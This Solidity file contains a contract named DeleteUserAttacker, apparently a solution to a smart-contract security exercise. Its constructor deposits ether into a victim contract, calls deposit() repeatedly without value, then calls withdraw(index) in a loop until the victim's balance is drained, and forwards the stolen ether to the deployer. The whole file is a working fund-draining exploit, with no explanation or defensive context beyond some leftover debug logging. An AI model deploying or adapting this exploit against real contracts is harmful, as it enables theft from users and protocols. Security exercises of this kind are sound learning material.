// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "hardhat/console.sol";

interface IDeleteUser {
    function deposit() external payable;

    function withdraw(uint256 index) external;
}

contract DeleteUserAttacker {
    constructor(address victim, uint256 index) payable {
        console.logBytes(abi.encode(keccak256(abi.encode(0))));
        console.logBytes(abi.encode(1, 2));
        console.logBytes(abi.encodePacked(uint64(1), uint64(2)));
        _attack(victim, index);
    }

    function _attack(address victim, uint256 index) private {
        IDeleteUser(victim).deposit{value: msg.value}();
        uint256 nWithdraws = victim.balance / msg.value;
        for (uint256 i; i < nWithdraws - 1; ) {
            IDeleteUser(victim).deposit();
            unchecked {
                ++i;
            }
        }
        for (uint256 i; i < nWithdraws; ) {
            IDeleteUser(victim).withdraw(index);
            unchecked {
                ++i;
            }
        }
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "withdraw failed");
    }

    receive() external payable {}
}
